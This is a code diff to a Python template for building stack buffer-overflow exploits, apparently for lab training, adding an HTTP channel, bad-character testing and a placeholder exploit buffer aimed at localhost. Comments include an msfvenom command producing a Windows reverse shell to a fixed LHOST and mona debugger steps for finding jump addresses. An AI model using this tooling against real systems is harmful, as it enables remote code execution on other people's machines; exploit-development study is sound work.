@@ -2,15 +2,14 @@
 
 # This is a Python based template to be used in
 # developing stack based buffer-overflow explitation
+#
+# pip install requests bs4
 import socket
 import traceback
 import struct
 import sys
-
-# Interaction type to use
-EXPLOIT_TYPE_INTERACTIVE = 1
-EXPLOIT_TYPE_DETECT_TIMEOUT = 2
-EXPLOIT_TYPE_INJECT_PATTERN = 2
+import requests
+from bs4 import BeautifulSoup
 
 EXPLOIT_TYPE_DETECT_TIMEOUT_MIN_BUFFER_SIZE = 1
 EXPLOIT_TYPE_DETECT_TIMEOUT_MAX_BUFFER_SIZE = 1024 * 5
@@ -19,17 +18,25 @@ EXPLOIT_TYPE_DETECT_TIMEOUT_MAX_BUFFER_SIZE = 1024 * 5
 CHANNEL_TYPE_SOCKET = 1
 CHANNEL_TYPE_HTTP = 2
 
-socket_timeout = 3.0
-socket_recv_buffer = 1024
+channel_type = CHANNEL_TYPE_SOCKET
 
-exploitType = 1
 target_host = "localhost"
 target_port = 31337
+
+# Only used with CHANNEL_TYPE_HTTP
+url = "http://" + target_host + ":" + str(target_port) + "/example"
+
+# Known bad characters
+badchars = [0x00, 0x0A] 
+
+# Only used with CHANNEL_TYPE_SOCKET
+socket_timeout = 3.0
+socket_recv_buffer = 1024
 wait_for_response = True
 debug = True
 
-payload_prefix = ""
-payload_suffix = "\n"
+payload_prefix = b""
+payload_suffix = b"\n"
 
 STATUS_SUCCESS = "success"
 STATUS_TIMEOUT = "timeout"
@@ -86,6 +93,12 @@ def pattern_offset(value, length=8192):
 #####################
 
 
+def send_http(payload):
+    resp = requests.post(url, data={"data": payload})
+    print("[<] RspCode: " + resp.status_code)
+    # soup = BeautifulSoup(resp.text, 'html.parser')
+
+
 def send_socket(payload):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((target_host, target_port))
@@ -97,8 +110,14 @@ def send_socket(payload):
     s.close()
 
 
-def build_final_payload(user_input):
-    payload = payload_prefix + user_input + payload_suffix
+def build_final_payload(payload):
+    if channel_type == CHANNEL_TYPE_SOCKET:
+        payload = payload_prefix + payload + payload_suffix
+    elif channel_type == CHANNEL_TYPE_HTTP:
+        payload = payload
+    else:
+        print("[!] Unknown channel_type")
+        exit()
     return payload
 
 
@@ -108,16 +127,22 @@ def build_filler_payload(splits):
     for split in splits:
         payload = payload + (chr(charCode) * int(split))
         charCode = charCode + 1
-    return payload
+    return payload.encode("utf-8")
 
 
 def send_payload(payload):
     try:
         print("")
 
-        payload = build_final_payload(payload).encode()
+        payload = build_final_payload(payload)
         print("[>] Req: " + str(payload))
-        send_socket(payload)
+        if channel_type == CHANNEL_TYPE_SOCKET:
+            send_socket(payload)
+        elif channel_type == CHANNEL_TYPE_HTTP:
+            send_http(payload)
+        else:
+            print("[!] Unknown channel_type")
+            exit()
         print("[*] Done")
         return STATUS_SUCCESS
     except socket.timeout:
@@ -141,49 +166,51 @@ def interactive():
             break
         if (user_input.startswith("py:")):
             user_input = eval(user_input[3:])
-        send_payload(user_input)
+        send_payload(user_input.encode("utf-8"))
 
 
 def detect_timeout():
     for i in range(EXPLOIT_TYPE_DETECT_TIMEOUT_MIN_BUFFER_SIZE, EXPLOIT_TYPE_DETECT_TIMEOUT_MAX_BUFFER_SIZE):
-        status = send_payload(i)
+        status = send_payload(("A" * i).encode("utf-8"))
         if (status == STATUS_TIMEOUT or status == STATUS_ERROR):
             break
 
 def exploit():
-    # msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f c –e x 86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
-    shellcode = ("")
+    # Compare badcharacter file with ESP:      !mona compare -a esp -f c:\badchar_test.bin
+    # Find pattern within registers:           !mona findmsp
+    # Payload generation:                      
+    #   msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f python –e x 86/shikata_ga_nai -b "\x00\x0a"
+    # NASM shell:                              msf-nasm_shell     metasm_shell.rb
+    # Look for loaded DLLs:                    !mona modules
+    # Find witing a module:                    !mona find -s "\xff\xe4" -m "wcapwsp.dll"
+    # Find instruction:                        !mona jmp -r esp -cpb "\x00\x0A"
+    # Instructions:                            Debug 0xCC / Nop 0x90 / 0xCC
+    # Exit functions:                          EXITFUNC=none / EXITFUNC=thread / EXITFUNC=process 
+    # Usual bad-characters:                    00 0a
+    # Nops or adjustment required due to - GetPC routine
 
-    filler = "A" * 780
-    eip = "\x01\x01\x01\x01" 
-    offset = "C" * 4
+    # ASCII strings (e.g. "ABCD") are stored front-to-back: "\x41\x42\x43\x44\x00"
+    # Code (e.g. "NOP # NOP # NOP # RET") is stored front-to-back: "\x90\x90\x90\xC3"
+    # Numbers (e.g. 0x1337) are stored back-to-front: "\x37\x13\x00\x00"
+    # Memory addresses or "pointers" (e.g. 0xDEADBEEF) are stored back-to front: "\xEF\xBE\xAD\xDE
+    #  >>> struct.pack("<I", 0xDEADBEEF)
+    #  '\xEF\xBE\xAD\xDE'
+    #  >>> struct.pack("<I", 3737844653)
+    #  '\xAD\xFB\xCA\xDE'
 
-    buffer = "D" * (1500 - len(filler) - len(eip) - len(offset))
-    inputBuffer = filler + eip + offset + buffer
+    buf_totlen = 1024
+    offset_srp = 146
 
-    nops = "\x90" * 10
-    inputBuffer = filler + eip + offset + nops + shellcode
+    buf = b""
+    buf += b"A" * (offset_srp - len(buf))    # padding
+    buf += b"BBBB"                           # SavedReturnPointer (SRP) overwrite : buf += struct.pack("<I", ptr_jmp_esp)
+    buf += b"CCCC"                           # ESP should end up pointing here "\xCC\xCC\xCC\xCC" 
+    buf += b"D" * (buf_totlen - len(buf))    # trailing padding
+    buf += b"\n"
 
-    send_payload(inputBuffer)
+    send_payload(buf)
 
-badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
-            "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
-            "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
-            "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
-            "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
-            "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
-            "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
-            "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
-            "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
-            "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
-            "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
-            "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
-            "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
-            "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
-            "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
-            "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
-
-
+print(badchars)
 def main():
     print_header = True
     while True:
@@ -196,7 +223,6 @@ def main():
             print("5 - pattern_send")
             print("6 - send_filler_chars")
             print("7 - find_bad_chars")
-            print("8 - reverse_shell")
             print("9 - exploit")
 
         option = input("Option > ")
@@ -225,7 +251,7 @@ def main():
             print_header = False
         elif (option.startswith("5")):
             try:
-                send_payload(pattern_create(option.split(" ")[1]))
+                send_payload(pattern_create(option.split(" ")[1]).encode())
             except IndexError:
                 print("Provide length along with the option (Example: '5 1024')")
                 print_header = False
@@ -233,15 +259,34 @@ def main():
             payload = build_filler_payload(option.split(" ")[1:])
             send_payload(payload)
         elif (option.startswith("7")):
-            filler_splits = option.split(" - ")[0].split(" ")[1:]
-            barchar_splits = option.split(" - ")[1].split(" ")
-            new_badchars = badchars
-            for barchar_split in barchar_splits:
-                char = chr(int(barchar_split,16))
-                print("Removing " + ascii(char))
-                new_badchars = new_badchars.replace(char, "")
-            payload = build_filler_payload(filler_splits) + new_badchars
+            section_splits = option.split(" - ")
+            filler_splits = section_splits[0].split(" ")[1:]
+            badchar_test = b""
+            try:
+                badchar_splits = []
+                if len(section_splits) > 1:
+                    badchar_splits = section_splits[1].split(" ")
+
+                altered_badchars = badchars.copy()
+                
+                for badchar_split in badchar_splits:
+                    altered_badchars.append(int(badchar_split, 16))
+
+                # generate the string
+                for i in range(0x00, 0xFF+1): # range(0x00, 0xFF) only returns up to 0xFE
+                    if i not in altered_badchars: # skip the badchars
+                        badchar_test += bytes([i]) # append each non-badchar char to the byte string
+
+                # open a file for writing ("w") the byte string as binary ("b") data
+                with open("badchar_test.bin", "wb") as f:
+                    f.write(badchar_test)
+
+            except IndexError:
+                print("No removals")
+            payload = build_filler_payload(filler_splits) + badchar_test
             send_payload(payload)
+        elif (option.startswith("9")):
+            exploit()
         else:
             print("[!] Unknown option")
 
